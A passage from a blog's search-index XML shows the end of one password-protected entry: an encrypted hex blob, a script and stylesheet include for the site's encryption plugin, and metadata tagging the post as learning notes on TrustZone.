data-hmacdigest="ca004565735f871f081cdea19f2cfcfd9a817f0cc6808e957ae54fa1d8968c7f">55310b5b6687c082813851bbeb951066ac161fd8955f425599eceb059ebae5fb58290ae4424fd3e8bf8063038d5b05f34a179ee8e0cd101f455c5a4d1431afb340fba4c3ee5ce00c3d6b6ec49f589bb0bda6bac5c4af8a498f310619d1e764ed82faf3b757d149a079bc85bc265be66ec2a238f0f0bda61d1d22a4b5cbaa5108839397f88b8bdab4d6f76287737cee353add8b0acd0896c240ac4ee81b862e930faaf03a66de7f32a9b3874ef4b160450b2b63775e35f21cada65c00b78f5ada734f25229e3716d1f9cc2e7e51e1ac35ec8f7fdd7b5cc831b8450edd90ba2ca658729cff5715d8ff13f6def988dc702dbbf51c8965a881f5dfe6c4f1e170689261fd56717d895148254771ce1895e45d3bf4afcda4f3a6a50a4a5f984f59979a514852c2a679e69324b7c94a6e62ac30704f2dbf76591e6549c2d5019f0d0e748e06a2bcb08587c4d2721ce74633e7bea0a677e5a769704241cc3e6dc5bd3895713972a4d57c1eb1d6b7c02600d75b44e7bbc7eb683977c2a4f323caf5cac0633dc03804ebfc3128b55129b578d78e1ac9c88cfe33c8f59c1fca620a0f4fa0b539644f13209c71591debb2d650793a1e7cf1633257e375da573aae3d0983e92ea74bbfeb533cb99288dd81430144b0e8b47ac95bb1f19247a102efb3f1f9518a5565b2c714f3a4a714beb81b2928e9b7d5eac6986ec67e855650f07ed89f56b9a6d746b367571788cf4c5609e7f524dbabe9915521bc8ac8f159846c4b023dac832302635ac248800ded3202f92f0fcbc0feb817ae3d49e0827c144ef6a8e8ac66ab007ff0bf4f176a72f784f9cdd39b9681ae126ce1345933b8270c6cca64390edda1a5d8549314329f4f3812350734477e72ab88f6d9089f1235f7f1dcd6a233214ca361dd6cf1156ce7d8ad8ef617b94a00e20772e9b100c659d4f52df9677418bf536b68565af74b183d24d41a1b920b5aed5b2546971a9c04509c9cc350f5ff88dba5bbe16141c5fc78bb53cfd8cef06201e2770934be5b4dc02e9061343b9f6298f6d2a59ce334599c7535618bab92b62158263b6b6a8f6644091ef5a32ff0b7f29104701eabee3ff65e93f9ab8c1d872a1fb9153636d45ce556c24bf2f1b8c2ebee36b675db549f61319f245a9a9d6f59f2ffdd102c0a962b81d1ad3f2752157c8665cd602c20fc261f7a738c5a04e4a7943df3b1be1894b8591aca20f87f8cee683cdb8dcccdfb8112620c6ee8c70ef9d6311e5b257ea36d1563e1afbb07e585123a8e41b14e7523d28051ec395cabca40366ead9372571e673f32c577b2dbd7dd50631307cd088b4baa32557195c1c343e28bcb9f43e318db46a183d4146b6ee0a0a1987bb077e592c024ac4c02980522ebd6e639bc7012a55201849c1a5ab29a6534d5a3d60d78959a6a0278a76126c5d00219cf44311de54522ca117e25b8e647174995f37cb6d5605852dd09564eecbc308d2721461e7433dcbfc6e06d82ffa7bde05586f7b775b046a23269dbb8332aac28f18ba66b19651f64bfe4cc2e906414027869ee6c499de3b9c001c34ee9929cf40a88698c15f2c7dc55864eab985fb93d1cd774bbc33d51adf1630f28400f7f433e03b3b5ae6f85600bd6d356824d1d8c88358f6f8c7cd04259d3101e60bd805acfbf4ebcf8df37ecc85deb0346e15deffe5e17a0770be47d97f1c9269f8d8b4aa9823d6dbbbb0b950451e958f221760bbd99a815784112d09d1df3054acefcf3ec895a10d55bd002f02862467abd3414cb9cbdc08753c6256d1510341ae4ab2ded425164457c7a491b5cb2c77857caaf3fe14d78202ba68771843ab6869a87fd31a7497ee4d6259a094fdcdc23196b797e8a1a3ac7c95f983137d1950b38153d14ad1970c67d198442023133b6e341408de4fee538ab112dc9e6b4d6c1e3697cb5263f4e42eefdecbca413405814b7ade616dc653cf750635726765280c4a9e295a73b2dd03783d19bf2be451bfdc6890c9f16d3b42a749ea7223fe1d91c5f90657bffdc0e2037c45130be1942f1eadb3cd77d124c2b73c13ccac4a3a45b68410e61a4ec191d7c763033e683b1d79e9ecad0c85d2e6e557063acf56515c6ef3d5fbc4a9b30a5b17a3fdf3431329e2b4fe1207efd8254dfed544fdb329458404e50331f16153a662adfa9fe957113994e7710f5b9ca18dd4093056799208c4ec3ce7c158a28b71575d6de12a4a138cc13daaf3dd53a065207f55913ef81f33b5e697526c1480b76ec60686f4e5d273a2f383bb70e180b16bfa7568853e33fb59c1061ded089f03691251109a821e3cd098c678f0318c174b0a2e2a1c8ebee750ca2164794129df8294e9b8b64eb38287f902cc07522c92457d1ec46aeef4639a35c376cc71e15efb41effadf2be7d97b06f6450a765812acc4b39d60d241840c4727002b015bc5fbc05717ec4b53db0024d8e5f29def6c7941b8ecc180daaa9bb9008f7758a86c5411691739796e01e488881861f12fe5e93097b48df9e92484158e1535e39d8c37f0c85f488f47cd686654f1f32f73975ac2e440b1ba29737debde65deeab52286c0f2e3d24c7678cfe5364ba377cfdeab221a39d0a4e5a53b2df2047c98d7be58cc82ef9b409239dd7737cb65b11437bbf01df91b98cd6231b35b1e147170d46f3f2ee064a02fc50b3ca166b0407e2e3a9cd82134f208b40fa50415c562c0a7e4ef3947f35f2ba40d35be243e8775ea98823eda1b64c802361bb1d579a02fd4a84bebb98c35ec84cc053008c4899529c0740b359c27523a33b68e305074e0cc8107db859ddb4e86de2307882ea6e280e182ec36ab254d56077ba001aecbec8d4d950f1b3830bb6aa4b62dbfed1a9ef70236f53bc9496770701c2c01d61eae7b69eb0508a2c01a7b6a1b0484ecfd18cfb178e1e2276b3cebec4dc6c42830fb2caec0fa67a87315f23d1ae83855924652ec7d6fffa33739c50942fa9192f2fe9cb94fabf8ba5236be3b219fcacec0fd56d27a3643f187f87f766f5e91aa253fcf6921d2f0b5ba474055c8db25ae2bddcb1f0170b4f890eee69480416aa4c8764283142b934b4d841b12615a066b9f731678135b39492d1b6f198a1733f3a57b26be1da02d650e13aa1dd32a5c2532d740720506bf2cf1cfe9583438cec687e4221a01f452fcc08ec7ba4b3dc47398418ef2acaebf686d0fa59af4d13b921052dc0a6f16138e5c9888f9ded5773225461a06d208ac315db3a5e3173943285ef86d3bf0ba1afc8a5ee296665f3f0fc2f06183827563c998e610e081180f777fcba33749b03583b63384e7303f8184c82a5be7bb92ce09e156ea0fbf6b20445d0d0aadc6c78144c0f02e7c78eaae200fdbc6e5149ff05d16b115f8e076681ddaa81590fb88b9ec2ac1da090b241cca7319461511c6f473dfc9dc59bf95e1bdba4f0186e0d6bbb1bd8ee1d85ec123b86a37abece5b2d9580d14532d525f6ea3e805264726b55ca211a85dc2cf9f1ae2ea9950e43c76bd959827d4d08bc13ad5067268bb05328aa1911a7fb172e1c4c3b2e82375b82e8f7ff7a4519264ff0177eb47731536d8c37e73e48e1e6e15fa16d0b7fc617c6a5f02b30b6071b3f421757f7c51d290aa496712b275024bcd52d7d120bb509214ba70dbbc1fef394dce87cc61cac329926765c130467e598e1a33a86aaea8d3bd59e93754149eef1f9bed07f6c29a4f02eea383d47be78315bdeb1cb1267dd7fca9ef95fdb771549b6ebd1690d781d87b2d5810a6565a8822ce2dca3d4495433a619e8c0a24a9e6089c746613d8c74d2c0c69fd2f23b8f3424a8862e8474f79d63b0848d6a808cf9cc0278cb9d996a2c7027aad6019f8d95950f791254b9f853db7e3024525ec9713d7a98d6495b8997b161a65265ca8ced9c942a2320a3e7848299cb1eaefdec43bb0cc3b23f8835ace847a0bf604f2c5dec58141246ca91ddd6ede4b8e7ae6b715bcd7646dd9264849bdeccb60423d0170eb2607547445303984492b15c2295449cf9df6a937d89428724eb49dca37b4a891e554d50c2e66a357c44b20fb100e6873091f08875b984598643fcfa30c73be5ce110ff1c1cd15ebaa4659bb34ab5ac0c52dedd68b6d7710ba3bca663cebe465472bc79938a5e5b449818102904d7ff7daf039bef0176d22459fa7e9ecf35b522677b2d6daf6b5e9167f2825dc111c2480790b3fbf98f8253be4fc5e1ecb44ee275d5acd0571da17d72175b169c9bb1bdb2bbec8b7829bc7d630ec8fa762b3f519f23dd1517418502381f6b2bc3e5e6f7f0f176db536d0b6378d4fea6d6afec0241752dc856783b24ad3840a95ca15a71ada62d4f78231f5be734c900003589f5957889949c353058fd30c90461e25df0ce66247f61c2e012ea72245c7810d628ccd48c797c615dbe3a471039f1494bb02ebfab24ba6a86e4c3e61a90c17e6a58c29f61a597481812e46fea4d955faa0b720fdf24dc148faf7baac1c9f1d23f258538cd3ce68569d4cbd23c1cecde578d3266cc7449fc453779e9fcd5e3d91a8c147a2ca48506bce3663ad754f1276f0216ce6de4d602f95c0c74131aec9ed6f9bbece82e6c58e313f71aa596d8d76d86c58d56b604f18ea7cc73a464c29e6af5745c92081cc8d922810ceb7b5aef946e8a44b1b999ac03c8009407e0b7a93ee39499d42e1ec43ea747f15cb53214969810708e570a88b46d7fcdf8ea9e0f70e6da4617be238cdc3f811191f008df6d902762fdaa030a53b33303b7370e3b6dba9b894fcf671eb80c185cabb231d5494325ec865279f2229afcc5e661440547cf9c2fed36eac81980a9fda67eaee6e66de88d15fb2bda1dfd9d7a7ddfb910d4db42115abd9063b782c0a213bd397232d93d200908dd3a8b50766c944f3266db4251b5452d594d94c6193d4d49288fef4a86c03d50aa56532d38fc5cfefa36eeafbad44d1171c137be4aa39655e9cbe0d3dcbe4ba5d311ea7fc077918696d31bec855f2526c151a9656d2524b56be903cfcd1d4e663883dd47ec4d17fd1e052336bf0088950f3e4ec58658f70fabd551fa7a2971122525bd077e79fb0c30621fd765bb2907ccdd9624d78eef9965ffcee036c9a13ecb114558056bd28d627a3fbd7bdd45444403d1dfb4ed3d65e307e87b948b953a1494d9980c2ef8259faff50e5cbdc94c593bd1dc4168d6f535bec3c95685878e2a8495128bb039703a69bd98eef20d1cdc8f07ebcfcde7bf611799c98a079cedbf6a0af761f26754c74cc2d0b737d0a1d3553dd5dd82273387b96fbe6faf4eae888eb7d274d5a36a598b17d16d4428e3a5a13253f307d6fbaf48338aa15a447684fff5e983cf77926af8f721db60ac6707b8ba311cfb4ec103aacc784f5ec8b3190637ca7c18daed9df61e7d966d35c17c4dfd1a195bd631e74b08403244875940d6dde84efc7165c79303c602cf9d5c7dbbe8385c58956b6c69282c16b84fd3ebb90cf099a958e1477952f1e146c7cb6194c7e2909d1fdb2df36d3668eca24eaf13cc2b9cf5b4cd08ce09b349963a824e31f029859ec7ea2e86d1d10d8ce17e4b65c44480912c6e70efb5d83eb99425ed2b65776fc363b8839b10b1f1873c5af04ebcad74ad84862626215c16380ac4405637efb5743edf48157d16b33d25d9c872851c6d3a9fb6ef896644dc574b6a849949f4d37828f9e8c9288bf65dde3fec781745c69ddbd31996e5e0755b36184dad78d6336376115ec0582a984ae6ddbd7eec1be594a786cf3de3244fb7c73323c5e913a0220725bf484c09b22a971975c3eb768607a834ab23f2aa7b54645f3ba1f85465ed47e33b44faaad74ea4c156155afdf240a5aa6edd389f338a4ad4367dbcb4377417d5f23f4adb28e36bbe07983faa5a201ec69929f5c71dd5eb4c6a6e46460909c7ab2b8e0c4e2a3c67e0d39afb30a6a68358ac09d3b883ce1c8cb440ffe155757bb9efc4ed57c02d57d9cd40116ada99a4a2461d0fae3810b9e05a3cfd5e624f565f60602f30c5f75f10f00b97fcf1621e9614c67720270f1dff89161de87ca956e5cf5ff52ccc9d5a9cb4cc4b611b9f1c621dbe032844a1b407e5f74ce611c7d5154eb36a2417117aa16ab7b77e04df78a5d4dc93e279232b0bb265bc99700a92eb99c9f0ccbff95c384f4554ee5c9b5d89e916ae5ab36f9a0328f8d34d5ec7e0c82247f8d12ee439598debaa385a02480852b90f7a403996d5b62748225d97919148e41daab9bd20bce87</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> LearningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TrustZone </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
